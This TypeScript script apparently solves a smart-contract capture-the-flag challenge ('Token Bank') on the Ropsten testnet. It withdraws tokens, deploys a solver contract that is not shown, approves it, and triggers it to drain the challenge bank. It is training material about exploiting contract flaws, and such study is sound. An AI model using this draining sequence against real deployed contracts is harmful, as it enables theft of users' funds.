import { BigNumber } from "@ethersproject/bignumber";
import { WeiPerEther } from "@ethersproject/constants";
import { Contract, ContractFactory } from "@ethersproject/contracts";
import { formatEther } from "@ethersproject/units";

import { artifacts } from "../artifacts";
import { provider, wallets } from "../constants";
import { deployments } from "../deployments";
import { log } from "../utils";

export const tokenBank = async (player = wallets[0]): Promise<void> => {
  const playerAddress = await player.getAddress();
  log(`Player address = ${playerAddress}`);
  log(`Player balance = ${formatEther(await provider.getBalance(playerAddress))}`);

  const challenge = new Contract(
    deployments.ropsten.TokenBankChallenge.address,
    deployments.ropsten.TokenBankChallenge.abi,
    player,
  );

  const token = new Contract(
    deployments.ropsten.SimpleERC223Token.address,
    deployments.ropsten.SimpleERC223Token.abi,
    player,
  );

  log(`Preparing to solve challenge at ${challenge.address}`);

  const factory = new ContractFactory(
    artifacts.TokenBankSolver.abi,
    artifacts.TokenBankSolver.bytecode,
    player,
  );

  const halfSupply = BigNumber.from("500000").mul(WeiPerEther);

  const solver = await factory.deploy(challenge.address);
  log(`Sent solver deployment tx: ${solver.deployTransaction.hash}`);
  await solver.deployTransaction.wait();
  log(`Solver deployment tx has completed, contract deployed to: ${solver.address}`);

  log(`Withdrawing all tokens from the player's TokenBank account`);
  const withdrawTx = await challenge.withdraw(halfSupply);
  log(`Withdraw tx has been sent: ${withdrawTx.hash}`);
  await withdrawTx.wait();
  log(`Withdraw tx has been mined`);

  log(`Approving our solver to spend our tokens at ${token.address}`);
  const approveTx = await token.approve(solver.address, halfSupply);
  log(`Approval tx has been sent: ${approveTx.hash}`);
  await approveTx.wait();
  log(`Approval tx has been mined`);

  const solveTx = await solver.solve({ gasLimit: "2000000" });
  log(`Solve tx has been sent: ${solveTx.hash}`);
  await solveTx.wait();
  log(`Solve tx has been mined`);

  log(`Challenge complete = ${await challenge.isComplete()}`);

};

